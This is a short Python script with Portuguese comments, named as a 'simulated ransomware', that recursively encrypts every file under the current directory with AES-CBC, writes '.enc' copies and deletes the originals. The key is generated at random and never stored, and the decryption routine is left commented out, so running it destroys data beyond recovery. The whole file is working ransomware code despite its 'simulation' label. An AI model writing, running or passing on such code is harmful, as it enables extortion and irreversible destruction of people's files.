from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
import os
import base64

# Função para gerar uma chave de criptografia
def gerar_chave():
    return os.urandom(16)  # Gera uma chave de 16 bytes (128 bits)

# Função para criptografar um arquivo
def criptografar_arquivo(arquivo, chave):
    cipher = AES.new(chave, AES.MODE_CBC)  # Usando o modo CBC (Cipher Block Chaining)
    
    with open(arquivo, 'rb') as file:
        dados = file.read()

    # Criptografando o arquivo
    dados_criptografados = cipher.encrypt(pad(dados, AES.block_size))

    # Salvar arquivo criptografado
    with open(arquivo + '.enc', 'wb') as file_enc:
        file_enc.write(cipher.iv)  # Escreve o vetor de inicialização (IV) no início do arquivo
        file_enc.write(dados_criptografados)

    # Apagar o arquivo original
    os.remove(arquivo)

# Função para descriptografar um arquivo
def descriptografar_arquivo(arquivo, chave):
    with open(arquivo, 'rb') as file:
        iv = file.read(16)  # O IV está armazenado nos primeiros 16 bytes do arquivo
        dados_criptografados = file.read()

    cipher = AES.new(chave, AES.MODE_CBC, iv)

    # Descriptografando o arquivo
    dados_descriptografados = unpad(cipher.decrypt(dados_criptografados), AES.block_size)

    # Salvar o arquivo descriptografado
    with open(arquivo[:-4], 'wb') as file_dec:
        file_dec.write(dados_descriptografados)

    # Apagar o arquivo criptografado
    os.remove(arquivo)

# Função para simular o ransomware
def ransomware_simulado(diretorio, chave):
    for root, dirs, files in os.walk(diretorio):
        for file in files:
            if not file.endswith('.enc'):  # Não criptografar arquivos já criptografados
                caminho_arquivo = os.path.join(root, file)
                criptografar_arquivo(caminho_arquivo, chave)
                print(f"Arquivo criptografado: {caminho_arquivo}")

# Exemplo de uso
if __name__ == '__main__':
    diretorio = '.'  # O diretório atual (substitua conforme necessário)
    chave = gerar_chave()

    print("Iniciando criptografia...")
    ransomware_simulado(diretorio, chave)
    print("Criptografia concluída.")

    # Para descriptografar (opcional, apenas para teste)
    # Descomente as linhas abaixo para testar a descriptografia
    # print("Iniciando descriptografia...")
    # for file in os.listdir(diretorio):
    #     if file.endswith('.enc'):
    #         arquivo_enc = os.path.join(diretorio, file)
    #         descriptografar_arquivo(arquivo_enc, chave)
    #         print(f"Arquivo descriptografado: {arquivo_enc}")
